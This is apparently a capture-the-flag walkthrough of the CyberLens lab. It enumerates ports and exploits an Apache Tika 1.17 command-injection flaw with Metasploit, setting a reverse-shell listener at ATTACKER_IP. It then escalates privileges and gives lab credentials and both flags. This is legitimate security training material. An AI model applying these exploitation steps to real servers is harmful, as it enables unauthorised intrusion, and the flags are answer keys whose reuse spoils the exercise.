# CyberLens Walkthrough

## Intro

Welcome to the clandestine world of **CyberLens**, where shadows dance in the digital domain and metadata reveals secrets hidden in every image.  
This challenge takes you into the art of digital forensics and image analysis, uncovering the stories each pixel holds.

> Think of it as CSI, but for hackers — grab your trench coat, magnifying glass, and Metasploit, because we’re going in.

**Challenge Objective:**  
Exploit the CyberLens web server and discover the hidden flags.

---

## Reconnaissance

We start with an **Nmap** scan:

```
PORT      STATE SERVICE       VERSION
80/tcp    open  http          Apache httpd 2.4.57 (Win64)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0
61777/tcp open  http          Jetty 8.y.z-SNAPSHOT (Apache Tika 1.17)
... (multiple MSRPC ports open)
```

- Port **80** → Main website
- Port **445** → SMB service
- Port **61777** → Apache Tika 1.17 server

<img width="1858" height="972" alt="Screenshot From 2025-05-19 17-07-37" src="https://github.com/user-attachments/assets/3923ce6e-57f2-4fcc-9f46-aed880fd0a49" />

---

## Web Exploration

The main site had:
- **Contact Us** page → Possible SQLi or reverse shell opportunity.  
- **Image Extractor** → Possible PHP reverse shell upload.

Tried PHP reverse shells and SQL injection — **no success**.

Checked the page **source code**, found reference to port **61777**.  
Navigated to it — Apache Tika 1.17.

<img width="1858" height="972" alt="Screenshot From 2025-05-19 17-30-34" src="https://github.com/user-attachments/assets/a800707b-4158-4961-b912-6c0b33fb7fe4" />

<img width="1858" height="972" alt="Screenshot From 2025-05-19 17-32-27" src="https://github.com/user-attachments/assets/4fa61ecd-882a-42ba-9ec2-43f24c1c606d" />


---

## Exploitation – Apache Tika

Apache Tika 1.17 is vulnerable to **command injection** (Exploit-DB 47208).  
Vulnerability: Improper handling of the `X-Parsed-By` header with `Content-Type: image/jp2`.

Mitigation (from vendor): Upgrade to patched version, validate headers.

**Metasploit setup:**
```
set LHOST ATTACKER_IP
set RPORT 61777
set RHOSTS cyberlens.thm
```
Exploit reference: [https://www.exploit-db.com/exploits/47208](https://www.exploit-db.com/exploits/47208)

<img width="1860" height="502" alt="Screenshot From 2025-05-19 17-37-49" src="https://github.com/user-attachments/assets/35648596-0813-43fd-9383-0ac15a090ea4" />

<img width="1857" height="967" alt="Screenshot From 2025-05-19 17-41-05" src="https://github.com/user-attachments/assets/583f2c42-16cd-43ac-bcfb-41a2b43dee56" />


---

## User Flag

Once inside, navigated to the **Cyberlens** user desktop:

**Flag:**
```
THM{T1k4-CV3-f0r-7h3-w1n}
```

<img width="1857" height="967" alt="Screenshot From 2025-05-19 17-42-57" src="https://github.com/user-attachments/assets/0b97d366-3a0f-4fe6-9f73-f79f4629c763" />

---

## Additional Exploitation Path

Found credentials in `Documents/CyberLens-Management.txt`:
```
Username: CyberLens
Password: HackSmarter123
```
Can be used for RDP access.

Related CVE: [CVE-2018-1335](https://rhinosecuritylabs.com/application-security/exploiting-cve-2018-1335-apache-tika/) — Command injection via `X-Tika-OCRTesseractPath` header.

<img width="1857" height="967" alt="Screenshot From 2025-05-19 17-48-00" src="https://github.com/user-attachments/assets/d99579c1-9758-413a-83c6-c30bfafec774" />

Alternative manual reverse shell example (Python2 PoC from Exploit-DB 46540) omitted here for brevity.

<img width="1857" height="967" alt="Screenshot From 2025-05-19 18-10-41" src="https://github.com/user-attachments/assets/05eba911-f33f-4ad9-9aa0-e96d2b121174" />
<img width="1857" height="967" alt="Screenshot From 2025-05-19 18-10-34" src="https://github.com/user-attachments/assets/c35c1fda-7edd-4a2b-8d6f-e5f23c360dff" />
<img width="1857" height="967" alt="Screenshot From 2025-05-19 18-10-29" src="https://github.com/user-attachments/assets/5a351170-3c10-4598-899b-0b49c4f9c48c" />

---

## Privilege Escalation

Used **Metasploit’s local_exploit_suggester** on Meterpreter session:

```
use post/multi/recon/local_exploit_suggester
set SESSION 2
run
```

Findings:
- **AlwaysInstallElevated** MSI privilege escalation
- **UAC Bypass** (comhijack, sluihijack)
- Printer privilege escalations (CVE-2020-1048, CVE-2020-1337)
- Secondary logon handle exploitation

After selecting the appropriate exploit, gained **Administrator** access.

**Admin Flag:**
```
THM{3lev@t3D-4-pr1v35c!}
```
<img width="1570" height="624" alt="Screenshot From 2025-05-19 19-14-01" src="https://github.com/user-attachments/assets/88119ce2-9041-40a4-9250-2159909c7da5" />
<img width="1573" height="812" alt="Screenshot From 2025-05-19 19-08-31" src="https://github.com/user-attachments/assets/67f27dc8-f73d-4a62-9b41-3222c4408001" />

---

## Conclusion

The CyberLens room demonstrated:
- Importance of **service enumeration**
- Value of checking for **less obvious ports**
- Using **Metasploit modules** efficiently
- Chaining initial access with **privilege escalation**

> Every pixel hides a story — and in this case, it told us exactly how to own the box.

